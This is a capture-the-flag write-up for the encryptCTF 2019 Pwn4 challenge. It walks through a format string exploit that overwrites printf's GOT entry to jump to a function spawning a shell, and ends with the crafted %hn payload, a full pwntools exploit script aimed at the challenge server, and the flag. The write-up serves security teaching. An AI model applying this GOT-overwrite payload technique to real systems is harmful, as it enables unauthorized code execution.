---
layout: single
title: encryptCTF 2019 Pwn Write-up 5 of 5
excerpt: Last part of my encryptCTF 2019 Pwn write-up series. This challenge tackles format string exploit — overwriting GOT entry to have a program flow control.
date: '2019-04-04T12:26:35.886Z'
classes: wide
categories:
- ctf
- encryptctf
tags:
- pwn
- format string
---

| ![First pwn board wipe of the year. hsb represent! ](https://cdn-images-1.medium.com/max/800/1*ycEO30rNNBaEmC9qIWf8VQ.png) |
|:--:|
| First pwn board wipe of the year. hsb represent!  |

### Pwn4 Solution (300 pts.)

> This challenge tackles format string exploit — overwriting GOT entry to have a program flow control.

Challenge description:

> GOT is a amazing series!

Based on the description, it seems that the challenge is all about manipulating GOT. And one known technique that focuses on overwriting GOT entries is format string exploit. Let’s try that exploit on this challenge.

Before we start, let’s do our basic checks on the binary.

![Commands used: `file` and `gdb` `checksec`](https://cdn-images-1.medium.com/max/800/1*PJpYOgnD-kDfw9PNLoFdkw.png)

Again, the file is a `32-bit ELF executable, PIE` and `RelRo` are disabled. Since `RelRo` is disabled, we are guaranteed that we can overwrite `GOT` entries.

Let’s try to run the binary and do a simple format string exploit test.

![Aha! A format string exploit ](https://cdn-images-1.medium.com/max/800/1*-1Mgfdjue5ER9Mdt7qjmxg.png)

> Quick note: You can read up an introduction about format string exploit from this resource: [https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)

We got a successful format string exploit. Let’s disassemble the program using gdb.
```
gef➤  disas main  
Dump of assembler code for function main:  
   0x08048551 <+0>: push   ebp  
   0x08048552 <+1>: mov    ebp,esp  
   0x08048554 <+3>: and    esp,0xfffffff0  
   0x08048557 <+6>: sub    esp,0xa0  
   0x0804855d <+12>: mov    eax,gs:0x14  
   0x08048563 <+18>: mov    DWORD PTR [esp+0x9c],eax  
   0x0804856a <+25>: xor    eax,eax  
   0x0804856c <+27>: mov    eax,ds:0x8049940  
   0x08048571 <+32>: mov    DWORD PTR [esp+0xc],0x0  
   0x08048579 <+40>: mov    DWORD PTR [esp+0x8],0x2  
   0x08048581 <+48>: mov    DWORD PTR [esp+0x4],0x0  
   0x08048589 <+56>: mov    DWORD PTR [esp],eax  
   0x0804858c <+59>: call   0x8048430 <setvbuf@plt>  
   0x08048591 <+64>: mov    DWORD PTR [esp],0x804868c  
   0x08048598 <+71>: call   0x80483f0 <puts@plt> (1) **  
   0x0804859d <+76>: lea    eax,[esp+0x1c]  
   0x080485a1 <+80>: mov    DWORD PTR [esp],eax  
   0x080485a4 <+83>: call   0x80483d0 <gets@plt> (2)**  
   0x080485a9 <+88>: lea    eax,[esp+0x1c]  
   0x080485ad <+92>: mov    DWORD PTR [esp],eax  
   0x080485b0 <+95>: call   0x80483c0 <printf@plt> (3)**  
   0x080485b5 <+100>: lea    eax,[esp+0x1c]  
   0x080485b9 <+104>: mov    DWORD PTR [esp+0x4],eax  
   0x080485bd <+108>: mov    DWORD PTR [esp],0x80486db  
   0x080485c4 <+115>: call   0x80483c0 <printf@plt> (4)**  
   0x080485c9 <+120>: mov    eax,0x0  
   0x080485ce <+125>: mov    edx,DWORD PTR [esp+0x9c]  
   0x080485d5 <+132>: xor    edx,DWORD PTR gs:0x14  
   0x080485dc <+139>: je     0x80485e3 <main+146>  
   0x080485de <+141>: call   0x80483e0 <__stack_chk_fail@plt>  
   0x080485e3 <+146>: leave    
   0x080485e4 <+147>: ret      
End of assembler dump.
```

Based on the disassembled main function, this is the overview of the program flow:  

```
(1) puts() — prints the welcome banner
(2) gets() — asks for a user input
(3) printf() — this is where the exploit occurs
(4) printf() — prints the user input
```

Luckily, there is another built-in function called after the exploit occured. We can overwrite the GOT entry of printf() and wait for `printf() (4)` to be executed.

![0x80498fc is the address of printf@got](https://cdn-images-1.medium.com/max/800/1*nhBy3vZvOOzdSR3-iw8rpA.png)

We already have a plan on where to overwite, but we still need “what to write” and “how to write”.

Let’s proceed with what to write.

We need to look for useful functions on the binary using `radare2`.

![0x0804853d is our `win` function!](https://cdn-images-1.medium.com/max/800/1*AGQCr-rbgEmfXRhdwX8dpQ.png)

Upon inspecting, I saw a function that executes “`system(‘/bin/bash’)`” @ `0x0804853d`. We can consider that as our `WIN` function!

Now, our last problem is how are we going to write `0x0804853d` to `0x80498fc.`

According to the resource link above, we can use “`%n`” to write an integer on a specific address. Using this technique, we can write the integer value of `0x0804853d` to `0x80498fc.`

A magic formula can be used to generate the payload for this.

![](https://cdn-images-1.medium.com/max/800/1*cAoAY3_lvl2FPYktw2EB6g.png)

```
HOB = `0x0804`  
LOB = `0x853d`

addr = `0x80498fc`

offset = ???
```

We still lack the offset for this formula.

We can compute the offset by getting the position of our known input string on the leaked stack. Let’s try to enter the string “AAAA” and leak the stack at the same time.

![Offset: 7](https://cdn-images-1.medium.com/max/800/1*Uc-tFdIDEML_huaf9uxSzQ.png)

We got the offset at 7. The value of `AAAA` in hexadecimal is `0x41414141` which gives us the offset value of 7.

The formula is now complete. Let’s build the payload.

```
HOB = `0x0804`  
LOB = `0x853d`

addr = `0x80498fc`

offset = 7

payload = [`0x80498fc` + 2][`0x80498fc`] + %.[`0x0804`-8]x%[7]$hn + %.[`0x853d`-`0x0804`]x%[7+1]$hn

payload = [`0x80498fe][0x80498fc]` + %.67580x%7$hn + %.32057x%8$hn
```

Sending the payload to the remote server will result to this.

![We got a shell! ](https://cdn-images-1.medium.com/max/800/1*QQ0AwdWIYN3j1VtVBOQM8g.png)

Flag: `encryptCTF{Y0u_4R3_7h3_7ru3_King_0f_53v3n_KingD0ms}`

Sample exploit script:
```
./exploit.py

from pwn import *

r = remote('104.154.106.182', 5678)

printf_got = 0x80498fc  
win_addr = 0x0804853d

offset = 7

# Overwrite printf GOT with win address  
# Payload structure  
# [addr + 2][addr] [0x10804 - 8][offset] [0x853d - 0x804][offset+1]

payload = ""  
payload += p32(printf_got+2)  
payload += p32(printf_got)  
payload += "%.67580x"  
payload += "%{}$hn".format(offset)  
payload += "%.32057x"  
payload += "%{}$hn".format(offset+1)

r.recvuntil('?')  
log.info('Payload formula: [addr+2][addr] + %.[HOB-8]x%[offset]$hn + %.[LOB-HOB]x%[offset+1]$hn')  
log.info('Sending payload...')  
log.info('Writing {} to {} (printf GOT).'.format(hex(win_addr), hex(printf_got)))

r.sendline(payload)  
r.recvuntil('2')  
log.info('Enjoy your shell. ')  
r.interactive()
```

-

— ar33zy

[hackstreetboys](https://hackstreetboys.ph/) aka [hsb] is a CTF team from the Philippines.

Please do like our [Facebook Page](https://www.facebook.com/hackstreetboys/) and Follow us on [Twitter](https://twitter.com/_hackstreetboys), [Medium](https://medium.com/hackstreetboys), and [GitHub](https://github.com/hackstreetboysph).
